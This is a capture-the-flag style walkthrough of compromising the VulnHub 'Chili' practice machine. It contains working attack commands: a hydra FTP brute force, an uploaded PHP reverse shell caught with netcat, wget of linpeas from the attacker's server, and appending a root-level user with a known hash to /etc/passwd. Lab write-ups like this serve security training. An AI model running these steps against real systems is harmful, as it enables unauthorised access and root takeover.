[Chili](https://www.vulnhub.com/entry/chili-1,558/) is a vulnerable system found on VulnHub. Below are the steps I utilized to compromise this vulnerable box.

First, after importing the machine, I ran **netdiscover -i eth0** to discover the IP address of the host.

Next, I ran **threader3000** to enumerate the TCP ports that were open on this host and let it complete it's recommended nmap scan.

It appears that there is both a web server and FTP running on this host. I first looked at the website to see if there was anything useful on it to start off. This returned a site with a picture of a chili pepper and nothing else. A review of the source code of the page revealed nothing of interest either.

Next, I ran **gobuster dir -u http://[machine ip]** to see if it came up with any results. Unfortunately this did not return any results.

I next turned my attention to the open FTP port. anonymous FTP was not open, but I decided to attempt to brute force FTP with hydra. I utilized the username of **chili** based on a hint listed on the vulnhub website. The command I used was **hydra -s 21 -l chili -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt  -t 20 [machine ip] ftp -V**. After a bit of time, the password was cracked:

Now that we have ftp credentials, lets log in and look around. After initially logging in, it appears that we are in the **/home/chili** directory.

We know SSH isn't running, or else we could upload a key to gain access. Since only FTP and HTTP are running, let's upload a root shell. First, let's run **cd /var/www/html** to navigate to the default HTML folder for Apache. Once here, we can run **ls -al** to list the directory contents to confirm we are in the main folder for the hosted website.

Next, let's upload [PenTestMonkey's Reverse PHP Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). We will need to modify the IP address and port as designated with the **// CHANGE THIS** section in the code with your attacker's IP and port of your choice to connect to.

Next, from your FTP session, run **cd /var/www/html/.nano** run **lcd [path to where you saved the reverse PHP shell]** followed by **put reverse-shell.php** to upload your PHP reverse shell. We did this as through testing we did not have the permissions to upload a shell to the /var/www/html folder, but the .nano subfolder we had permissions to access.

Next, in another terminal window, run **nc -nvlp [port #]** where port # is the port you specified in the reverse shell. This will create a listener on this port on your attacker machine.

Next, navigate to **http://[machine ip]/.nano/reverse-shell.php**. Unfortunately, this does not create a shell, this is because we did not make the php file executable. From the FTP session, run **chmod 777 reverse-shell.php** and then try to reload the web page.

Now, go back to your netcat terminal window, you should have a reverse shell. Running **whoami** will let you know you are currently the **www-data** user.

Let's run **linpeas** in order to enumerate this host for potential avenues of privilege escalation to root. In order to do so, you will need to host a python HTTP server in a folder that has the **linpeas.sh** script on your attacker machine. The command to run to host an HTTP server is **python3 -m http.server**.

Next, from your foothold as www-data, run **cd /tmp**, **wget http://[attacker ip]:8000/linpeas.sh**, and finally, **chmod 777 linpeas.sh**. The **/tmp** folder is used as it is typically writeable by any user, the 2nd command downloads the script from your attacker machine, and the 3rd one makes it executable.

Now, run **./linpeas.sh** and review the results. After review, it appears that we can write to the **/etc/passwd** file.

Next, let's run **cd /etc** followed by **ls -al|grep passwd** to confirm we have write access to this file. It appears that we do.

![Chili /etc/passwd](/assets/img/Chili16.png)

Let's use openssl to generate a password of **pwned** and use it to create a **root2** user and add it to the /etc/passwd file with **echo "root2:pr652V7MdLRRg:0:0:root:/root:/bin/bash" >> /etc/passwd**

Next, let's run **su root2** and enter the password we just created (**pwned**). Running **whoami** shows you are now running as root.

Finally, let's run **cd /root** followed by **ls -al** and finally **cat proof.txt** to finish this box.
